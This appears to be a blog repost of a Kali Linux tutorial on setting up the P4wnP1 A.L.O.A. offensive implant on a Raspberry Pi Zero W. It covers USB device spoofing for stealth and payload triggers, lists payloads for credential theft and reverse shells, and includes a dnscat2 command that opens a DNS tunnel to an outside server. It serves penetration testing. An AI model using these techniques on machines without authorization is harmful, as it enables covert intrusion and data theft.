<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>Community Showcase Raspberry Pi Zero W P4wnP1 ALOA</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>
	==========================<br>
	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
	==========================
	<div style="float: right;">A Techi Personal Blog</div><br>
	<p>
	<nav>
			<a href="/"><b>Start</b></a>.
			
			
			<a href="/posts/"><b>Posts</b></a>.
			
			<a href="/categories/"><b>Categories</b></a>.
			
			<a href="/tags/"><b>Tags</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>Community Showcase Raspberry Pi Zero W P4wnP1 ALOA</h1>
			<b><time>13.10.2022 00:00</time></b>
		       

			<div>
				<h1 id="community-showcase-raspberry-pi-zero-w-p4wnp1-aloa">Community Showcase Raspberry Pi Zero W P4wnP1 ALOA</h1>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/kali-p4wnp1-banner.jpg">https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/kali-p4wnp1-banner.jpg</a></p>
<p>The Kali community has been hard at work (as always!), and we want to showcase what we think is a very cool project of Kali Linux on a Raspberry Pi Zero W, the ‚ÄúP4wnP1 A.L.O.A. (A Little Offensive Application)‚Äù. It takes the standard Kali Linux image and adds custom software and</p>
<p>The Kali community has been hard at work (as always!), and we want to showcase what we think is a very cool project of Kali Linux on a <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w/">Raspberry Pi Zero W</a>, the ‚Äú<strong><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">P4wnP1 A.L.O.A.</a></strong> (<strong>A</strong> <strong>L</strong>ittle <strong>O</strong>ffensive <strong>A</strong>pplication)‚Äù.</p>
<p>It takes the standard Kali Linux image and adds custom software and some extra firmware designed for the Raspberry Pi Zero W to turn it into a <strong>Swiss Army knife of attacks and exfiltration</strong>.</p>
<p>This blog post will be a <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#using-the-p4wnp1-aloa">brief overview</a> of how to get started using the web interface, <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#creating-our-own-trigger">setting up a trigger</a> as well as <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#installing-a-package-when-connected-in-client-mode">installing additional packages</a> found in Kali Linux. There is a lot more to P4wnP1 than this blog post goes over, which is why we have included <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#other-resources">additional reading material</a> from the community which cover additional attack scenarios as well as more payloads that people have written if you want to go deeper!</p>
<p>If you have a Raspberry Pi Zero W, we highly recommend giving this image a try. We see this as a great tool in any tester‚Äôs toolkit!</p>
<h2 id="shopping-list">Shopping List</h2>
<ul>
<li><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w/">Raspberry Pi Zero W</a> <em>(<strong>not</strong> Zero 2 W)</em></li>
<li>Raspberry Pi Zero W <a href="https://www.makerfocus.com/products/usb-type-a-adapter-board-for-raspberry-pi-zero-w">USB-A Add-on Board</a> (optional but recommended)</li>
<li>MicroUSB to USB-A cable (required if you are not using the above add-on board)</li>
<li>MicroSD card (32GB or larger)</li>
<li><a href="https://www.kali.org/get-kali/">Kali Linux Raspberry Pi Zero W P4wnP1 A.L.O.A.</a> image</li>
</ul>
<h2 id="setting-up-to-get-down-to-business">Setting Up To Get Down To Business</h2>
<p>First thing, download the <a href="https://www.kali.org/get-kali/#kali-arm">Kali P4wnP1 A.L.O.A. image</a>. <em>At the time of writing, the current version is 2022.3:</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>kali@kali:~/Downloads$ ls
</span></span><span style="display:flex;"><span>kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz
</span></span></code></pre></div><hr>
<p>We will verify the download as well, by going back to the download page and clicking on the <code>sum</code> link on the <strong>Raspberry Pi Zero W (P4wnP1 A.L.O.A)</strong> line to get the SHA256 checksum:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>kali@kali:~/Downloads$ echo &#34;210635bb3dc7876b638a7035cd4dc60e0b134b19a6aec42a75f5995036b45840 kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz&#34; | sha256sum -c
</span></span><span style="display:flex;"><span>kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz: OK
</span></span></code></pre></div><hr>
<p>Now that we have verified that we have downloaded the file and it matches, we write it to the microSD card, which on <strong>our system</strong> is <code>/dev/sdb</code> - on <strong>your system this may be different</strong>, <strong>do NOT just copy and paste</strong> what we have put here, because you <strong>WILL</strong> overwrite whatever you have on your system‚Äôs <code>/dev/sdb</code> if you do.</p>
<p>The <code>xzcat</code> command will open the compressed image file and pipe it to the <code>dd</code> command, which will do the actual writing to the microSD card. The use of <code>xzcat</code> is a quick trick, as it removes having to actually uncompress the image first:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>kali@kali:~/Downloads$ xzcat kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz | sudo dd of=/dev/sdb bs=1M status=progress
</span></span><span style="display:flex;"><span>[sudo] password for kali:
</span></span><span style="display:flex;"><span>6421807104 bytes (6.4 GB, 6.0 GiB) copied, 101 s, 63.6 MB/s
</span></span><span style="display:flex;"><span>0+577993 records in
</span></span><span style="display:flex;"><span>0+577993 records out
</span></span><span style="display:flex;"><span>6442450944 bytes (6.4 GB, 6.0 GiB) copied, 162.961 s, 39.5 MB/s
</span></span></code></pre></div><p>The speeds above are on our system, these will differ based on your system and the speed of the microSD card that you are using.</p>
<hr>
<p>Now that this is done, we can unplug the microSD card from the machine, and plug it in to our Raspberry Pi Zero W. If you are using a USB-A adapter similar to what we linked to in the ‚Äú<a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#shopping-list">shopping list</a>‚Äù section, you can plug it in to your computer to power it on, otherwise power the Raspberry Pi Zero W via the micro port as usual.</p>
<p>Since the first boot of Kali Linux will do things like resize the filesystem, and set up the <a href="https://www.kali.org/docs/introduction/default-credentials/">default credentials</a> (user: <code>kali</code>, password: <code>kali</code>) the timing will vary based on microSD card speed.</p>
<h2 id="using-the-p4wnp1-aloa">Using the P4wnP1 A.L.O.A.</h2>
<p>Once it is booted, you will know everything is <strong>ready to go, when you see the default wireless network</strong>: <code>üí•üñ•üí• ‚ìÖ‚ûÉ‚ìå‚ìÉüÖü‚ù∂</code>. <em>Handy if you do not have an HDMI monitor plugged in!</em></p>
<p>Select the above SSID, and then we login with the <strong>password</strong>: <code>MaMe82-P4wnP1</code>.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/select-network-1.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/select-network-1.png" alt="" />
</figure>


</a></p>
<hr>
<p>Now that we are connected, we should see our wireless device is connected and has an IP address in the <code>172.24.0.xxx/24</code> range:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>kali@kali:~$ ip a
</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
</span></span><span style="display:flex;"><span>link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>inet6 ::1/128 scope host
</span></span><span style="display:flex;"><span>valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>2: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 4096
</span></span><span style="display:flex;"><span>link/ether 00:03:7f:12:1f:ae brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>inet 172.24.0.12/24 brd 172.24.0.255 scope global dynamic noprefixroute wlan0
</span></span><span style="display:flex;"><span>valid_lft 297sec preferred_lft 297sec
</span></span></code></pre></div><p>We can see that the IP address of our <code>wlan0</code> adapter is <code>172.24.0.12</code>, so <strong>we are connected</strong>! Since we are successfully connected, lets pull up the web interface in our browser.</p>
<p>The <strong>default IP</strong> address of the P4wnP1 A.L.O.A image is <code>172.24.0.1</code> and the service listens on port <code>8000</code> so we go to <a href="http://172.24.0.1:8000/">http://172.24.0.1:8000/</a> in our browser.</p>
<hr>
<p>Upon login we can see the list at the top: <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#usb-settings">USB Settings</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#Wi-Fi-settings">Wi-Fi Settings</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#bluetooth">Bluetooth</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#network-settings">Network Settings</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#trigger-actions">Trigger Actions</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#event-log">Event Log</a></strong> and <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#generic-settings">Generic Settings</a></strong>.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png" alt="" />
</figure>


</a></p>
<p>One quick thing to note as we are going through the interface below. Under the navigation menu, each section has various buttons, depending on what screen is currently being shown. A legend for what these buttons mean:</p>
<p>Name</p>
<p>What it does</p>
<p>Deploy</p>
<p>Activate</p>
<p>Deploy Stored</p>
<p>Load something that is saved, and activate it</p>
<p>Reset</p>
<p>Return to default settings</p>
<p>Store</p>
<p>Save</p>
<p>Load Stored</p>
<p>Load something that has been saved</p>
<p>Run</p>
<p>Run the current HID Script</p>
<p>Load &amp; Replace</p>
<p>Load a saved HID Script and Replace the current contents with it</p>
<p>Load &amp; Prepend</p>
<p>Load a saved HID Script, and add it to the beginning of the current script</p>
<h4 id="usb-settings">USB Settings</h4>
<p>Here we can <strong>change the Vendor ID (VID)</strong> &amp; <strong>Product ID (PID) of the device</strong>, so if you want to pretend to be a specific storage device, you can! You can also alter <strong>Manufacturer Name</strong> &amp; <strong>Product Name</strong>, as well as the <strong>serial number</strong> if you really want to clone a certain device. <em>Great if you are trying to be stealthy and have done your homework by scoping out the environment.</em></p>
<p>You can also change various other settings to alter the behavior of how the USB device acts (allowing for keyboard, mouse, network support, mass storage, and even serial)!</p>
<p><em>A nice resource to point out here is <a href="http://www.linux-usb.org/usb-ids.html">The USB ID Repository</a>, which is a large database of known values used for USB devices.</em></p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png" alt="" />
</figure>


</a></p>
<h4 id="wi-fi-settings">Wi-Fi Settings</h4>
<p>The Wi-Fi settings allows you <strong>change the Wi-Fi SSID network name</strong>, <strong>password</strong> (aka Pre Shared Key, PSK) as well as the <strong>channel</strong> which is being used. By altering these values, you can start to blend into the background by being less distinctive <em>(and more secure by not using default credentials)</em>!</p>
<p>To apply the settings, you will click on the ‚ÄúDeploy‚Äù button. Keep in mind, when you change the settings and hit ‚ÄúDeploy‚Äù you will be disconnected and need to reconnect with your new settings.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-settings.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-settings.png" alt="" />
</figure>


</a></p>
<p>The default Wi-Fi mode is <strong>Access Point (AP)</strong>, which allows for other devices to connect to P4wnP1‚Äôs wireless network.</p>
<p>Alternatively, you can also set the P4wnP1 to be a <strong>client</strong> (client mode) on the network, instead of a AP. Using the pre-defined configurations, P4wnP1 will then connect to the network and behave like another device on the network.</p>
<p>The final option, <strong>Client with Fallover to AP</strong>, gives you the ‚Äúbest of both worlds‚Äù as P4wnP1 will attempt to connect as a client, and if that fails, then switch to being a Access Point. Neat!</p>
<p>For example, we will set it up in this fall over mode. So if the <code>kali Wi-Fi network</code> is in range and has the correct key, it should connect to that as a client, if not, if we are not in range, or it cannot see it, it will start up the access point <code>network</code>.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-client-with-failover-ap.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-client-with-failover-ap.png" alt="" />
</figure>


</a></p>
<p>If the airwaves are being monitored, you can simply disable the Wi-Fi network as well.</p>
<h4 id="bluetooth">Bluetooth</h4>
<p>Moving on, we have the Bluetooth settings.</p>
<p>In this section, we can enable or disable Bluetooth. If <strong>discoverable</strong>, we can set the <strong>Bluetooth name</strong>, (with the default being <code>P4wnP1</code>). We can also set the <strong>Bluetooth PIN</strong> used to connect (the default PIN is <code>1337</code>) - PIN is only used if ‚ÄúSecure Simple Pairing (SSP)‚Äù is turned off.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-bluetooth.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-bluetooth.png" alt="" />
</figure>


</a></p>
<hr>
<p>For the Bluetooth network settings, the <strong>P</strong>ersonal <strong>A</strong>rea <strong>N</strong>etwork profile (PAN) is used. Keep in mind that you typically have a range of 10 meters (33 ft) with Bluetooth connections.</p>
<p>Some quick definitions for people who may not be familiar with Bluetooth Personal Area Network profiles:</p>
<p>Profile</p>
<p>Definition</p>
<p>PANU</p>
<p>Peer-to-Peer connection (one to one)</p>
<p>PAN-GN</p>
<p>Group Ad-hoc Network (GN) of up to 8 devices</p>
<p>PAN-NAP</p>
<p>Network Aggregation Point (NAP) can bridge the Bluetooth connection to the wireless connection</p>
<p>So if you set the P4wnP1 to be in PAN-NAP (the default), you can connect up to 10 devices to the P4wnP1 over Bluetooth and share its network connection that way.</p>
<p>If you were to set it up with PAN-GN, then up to 7 additional devices could connect to the P4wnP1, and can communicate with each other but there is no Internet access.</p>
<p>And if you were to use PANU, then you can only transfer data between the device connected to the P4wnP1 and the P4wnP1 itself.</p>
<h4 id="network-settings">Network Settings</h4>
<p>The next tab is Network Settings, where we can change the options for the <strong>different ways of connecting to the P4wnP1</strong>.</p>
<p>You can connect via <strong>Bluetooth (bteth)</strong>, <strong>USB (usbeth)</strong>, or as we currently are, via <strong>Wi-Fi (wlan0)</strong>.</p>
<p>To make any changes, you select the interface, and make the change for that interface, including using <strong>DHCP</strong> or setting <strong>static IP</strong> values. You can also alter some DHCP options here. Under the hood, <a href="https://manpages.debian.org/testing/dnsmasq-base/dnsmasq.8.en.html">dnsmasq</a> is being used.</p>
<p>For example, you may wish to have Wi-Fi set to client mode, using the network DHCP server and have Bluetooth enabled as a fallback interface, which is running a DHCP server.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-network-settings.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-network-settings.png" alt="" />
</figure>


</a></p>
<h4 id="trigger-actions">Trigger Actions</h4>
<p>Now we have triggers.</p>
<p>Triggers are the main way of doing things with the P4wnP1, when certain conditions are met. You can <strong>think of a trigger action as a payload</strong>. Whatever you set up here, <strong>if the conditions are met, the actions you set happen</strong>.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png" alt="" />
</figure>


</a></p>
<hr>
<p>Triggers are very powerful, and the sky is the limit when creating them. To get your feet wet, some trigger actions are:</p>
<ul>
<li>Service started - <em>Do something when a service has started on the P4wnP1</em></li>
<li>USB gadget connected to host - <em>Do something when the P4wnP1 is connected to a host</em></li>
<li>USB gadget disconnected from host - <em>Do something when the P4wnP1 is disconnected from a host</em></li>
<li>Wi-Fi Access Point is up - <em>Do something when the P4wnP1‚Äôs access point is up</em></li>
<li>Joined existing Wi-Fi - <em>Do something when the P4wnP1 joins a Wi-Fi network as a client</em></li>
<li>DHCP lease issued - <em>Do something when a DHCP lease is issued to a device connected to the P4wnP1</em></li>
<li>Input on GPIO - <em>Do something based on the Raspberry Pi GPIO pins input</em></li>
<li>SSH user login - <em>Do something when a user logs in to the P4wnP1 via SSH</em></li>
</ul>
<p>If you want to dig a little deeper <em>(and keep your workflow simpler with meaningful naming values)</em>, you can use <strong>group channels</strong>. As the name suggests, you can group actions together. This then allows for easier to read rules, as well as more complex logic. These options are:</p>
<ul>
<li>A value on a group channel - <em>Do something when a specific value on a group channel matches</em></li>
<li>Multiple values on a group channel - <em>Do something once multiple values on a group channel match</em></li>
</ul>
<p>Example scenario of this could have the end result to ‚Äúrun a bash script on the P4wnP1‚Äù, but the conditions for this to happen is when ‚ÄúWi-Fi Access Point is up‚Äù as well as ‚ÄúUSB gadget connected to host‚Äù are both met. So you create a few triggers:</p>
<ul>
<li>On ‚ÄúWi-Fi Access Point is up‚Äù -&gt; send value ‚Äú1‚Äù to group ‚Äúconnected‚Äù</li>
<li>On ‚ÄúUSB gadget connected to host‚Äù -&gt; send value ‚Äú2‚Äù to group ‚Äúconnected‚Äù</li>
</ul>
<p>We can go even more complex logic with the rules with making the third trigger. We can control the ordering using ‚Äúexact ordered sequence‚Äù. So does it matter if the device is plugged in before the Wi-Fi access point is up? By using:</p>
<ul>
<li><code>type &quot;All (logical AND)&quot;</code> the <strong>ordering does not matter</strong> in order to do the action</li>
<li><code>exact ordered sequence</code> the <strong>order matters</strong> in order to trigger the action</li>
</ul>
<p>With what we have in mind, we do not require a certain sequence of events so we use <code>multiple values on group channel&quot;; values (1,2); type &quot;All (logical AND)&quot; -&gt; Start bash script</code>.</p>
<p>Something else to keep in mind when coming up with ideas, you can enable ‚Äúone shot‚Äù mode, which will only trigger once, rather than every time the event happens. Handy if the P4wnP1 is disguised as another device, it can then behave ‚Äúnormally‚Äù after running the payload the first time.</p>
<h4 id="hidscript">HIDScript</h4>
<p>Moving on to the HIDScript tab, if you have ever used <a href="https://github.com/hak5/usbrubberducky-payloads">DuckyScript</a>, HIDscripts are similar, but based upon JavaScript rather than bash.</p>
<p>‚ÄúHIDScripts‚Äù run on Raspberry Pi device and they interact with the enumerated ‚Äúfake‚Äù hardware which is connected externally, however ‚Äúbash scripts‚Äù run on the Raspberry Pi OS ‚Äúinternal‚Äù.</p>
<p>To get you started, P4wnP1 pre-populates with a simple HIDScript (called <code>hidtest1.js</code>) that will launch notepad on a Windows computer, types out a phrase, then moves the mouse, and then repeats it without any delays. More about this can be found in our <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#creating-our-own-trigger">example trigger</a>.</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-hidscript.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-hidscript.png" alt="" />
</figure>


</a></p>
<hr>
<p>In the <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#other-resources">Other Resources</a> at the end of this post you can find additional payloads that people have written, if you want, or need, some inspiration, such as:</p>
<ul>
<li>Extract Chrome and Internet Explorer credentials as well as any stored Wi-Fi networks information, and copy them to the P4wnP1</li>
<li>Open a webpage</li>
<li>Run an command as administrator on the target system the P4wnP1 is plugged in to</li>
<li>Using just PowerShell commands, create a reverse shell with administrator rights</li>
</ul>
<p>To help create and debug HIDscripts, you can click the <code>RUN</code> button at any time to execute, rather than having do the events of a trigger action.</p>
<h4 id="event-log">Event Log</h4>
<p>The Event Log tab is where events are logged, if you have set up any triggers to log.</p>
<p>The Event Log is <em>only</em> for P4wnP1 A.L.O.A. events, and does not include logs on the system itself.</p>
<p>This is useful for debugging any payloads and triggers you are writing, tracking process of actions, and retrieving contents of payloads,</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-eventlog.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-eventlog.png" alt="" />
</figure>


</a></p>
<h4 id="generic-settings">Generic Settings</h4>
<p>And finally we have our Generic Settings, where we can do things like use the <strong>Master Template Editor</strong> to control what the defaults are every time it boots as well as <strong>Reboot</strong> or <strong>Shutdown</strong> the P4wnP1 device, and also make a <strong>backup</strong> or <strong>restore</strong> the P4wnP1 database (so your settings and hard work is preserved).</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-generic-settings.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-generic-settings.png" alt="" />
</figure>


</a></p>
<h2 id="creating-our-own-trigger">Creating our own Trigger</h2>
<p>Now that we have covered using the web interface of the P4wnP1 A.L.O.A., let‚Äôs put the information we have gained into practice. As an example, lets set the P4wnP1 up so that when we:</p>
<p><strong>Plug the P4wnP1 into a Windows machine</strong> while <strong>in USB gadget mode</strong>, <strong>it will run the default <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a> <code>hidtest1.js</code></strong> to run a command and move the mouse about.</p>
<p>First, let‚Äôs go into the web interface and click on trigger actions:</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png" alt="" />
</figure>


</a></p>
<hr>
<p>Then we will click on <strong>Add One</strong>, which brings up the following modal window and in order to change any settings, <strong>it has to be enabled</strong>, so we will quickly do that too:</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-enabled.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-enabled.png" alt="" />
</figure>


</a></p>
<hr>
<p>In this case, we will choose: <code>USB gadget connected to host</code>:</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-usb-gadget-connected-to-host.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-usb-gadget-connected-to-host.png" alt="" />
</figure>


</a></p>
<hr>
<p>Now we select the action to take, which is ‚ÄúStart a <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a>‚Äù:</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-action-start-HID.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-action-start-HID.png" alt="" />
</figure>


</a></p>
<hr>
<p>Now we choose which <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a> to load. For this example we will load the default HIDscript that is written, called <code>hidtest1.js</code>, which will launch notepad, type out ‚ÄúHello from P4wnP1 run‚Äù and then move the mouse to the right, then left, and then it will do it again, but much faster, to show the speed at which the P4wnP1 can run them.</p>
<p><em>Any HIDScripts that you write, or get from the community, will show up in this list once they are added to your P4wnP1. The list below are just the default ones that come with the P4wnP1.</em></p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-select-hidtest.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-select-hidtest.png" alt="" />
</figure>


</a></p>
<hr>
<p>Lastly, to save our trigger, we click the <code>Update</code> button:</p>
<p><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-update.png">
<figure>
  <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-update.png" alt="" />
</figure>


</a></p>
<p>Happy hacking!</p>
<h2 id="installing-a-package-when-connected-over-ssh">Installing A Package When Connected over SSH</h2>
<p>When you have Internet access on the P4wnP1, you have the full arsenal of Kali‚Äôs repositories available to you. So any package you can install in Kali on a Raspberry Pi Zero W will be available for use in bash scripts you may write. You can access those scripts via <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#trigger-actions">triggers</a>.</p>
<p>However you are connected to P4wnP1, you can SSH in using either the <code>kali</code> and <code>root</code> users. The <a href="https://www.kali.org/docs/introduction/default-credentials/">default credentials</a> are:</p>
<ul>
<li><code>kali</code> / <code>kali</code></li>
<li><code>root</code> / <code>toor</code></li>
</ul>
<p>We are now going to install the package <a href="https://www.kali.org/tools/dnscat2/">dnscat2-client</a> on P4wnP1, then connect to a <a href="https://www.kali.org/tools/dnscat2/#dnscat2-server">dnscat2-server</a> we have already set up somewhere else.</p>
<p>As a reminder, we always want to run <code>sudo apt update</code> before installing packages, to ensure we get the latest version:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ sudo apt update
</span></span><span style="display:flex;"><span>[...]
</span></span><span style="display:flex;"><span>kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$
</span></span><span style="display:flex;"><span>kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ sudo apt -y install dnscat2-client
</span></span><span style="display:flex;"><span>Reading package lists... Done
</span></span><span style="display:flex;"><span>Building dependency tree... Done
</span></span><span style="display:flex;"><span>Reading state information... Done
</span></span><span style="display:flex;"><span>Suggested packages:
</span></span><span style="display:flex;"><span>dnscat2-server
</span></span><span style="display:flex;"><span>The following NEW packages will be installed:
</span></span><span style="display:flex;"><span>dnscat2-client
</span></span><span style="display:flex;"><span>0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
</span></span><span style="display:flex;"><span>[...]
</span></span></code></pre></div><p>Now, we can just simply run the suggested command when setting up <code>dnscat2-server</code> on our other machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ dnscat --dns server=10.0.13.37,port=53 --secret=5672ddb107fe2f33e490a83e8d1036ca
</span></span><span style="display:flex;"><span>Creating DNS driver:
</span></span><span style="display:flex;"><span>domain = (null)
</span></span><span style="display:flex;"><span>host = 0.0.0.0
</span></span><span style="display:flex;"><span>port = 53
</span></span><span style="display:flex;"><span>type = TXT,CNAME,MX
</span></span><span style="display:flex;"><span>server = 10.0.13.37
</span></span><span style="display:flex;"><span>** Peer verified with pre-shared secret!
</span></span><span style="display:flex;"><span>Session established!
</span></span></code></pre></div><p>Happy hacking (again)!</p>
<h2 id="credits">Credits</h2>
<p>The <a href="https://p4wnp1.readthedocs.io/">original</a> author of P4wnP1 A.L.O.A. is <a href="https://twitter.com/mame82">Marcus Mengs aka MaMe82</a>.</p>
<p><a href="https://github.com/rogandawes">Rogan Dawes</a> took over maintainership when Marcus needed to step away.</p>
<h2 id="reminder">Reminder</h2>
<p>We love seeing what the community builds on top of Kali Linux, if you are working on a project let us know!</p>
<p>You can reach out to us on <a href="https://twitter.com/kalilinux">Twitter</a> or on our <a href="https://discord.kali.org/">Discord</a>.</p>
<h2 id="other-resources">Other Resources</h2>
<p><strong>Project Resources</strong>:</p>
<ul>
<li><a href="https://github.com/RoganDawes/P4wnP1_aloa">P4wnP1 A.L.O.A. Homepage</a></li>
<li><a href="https://twitter.com/P4wnP1">P4wnP1 Twitter</a></li>
</ul>
<p><strong>Kali Resources</strong>:</p>
<ul>
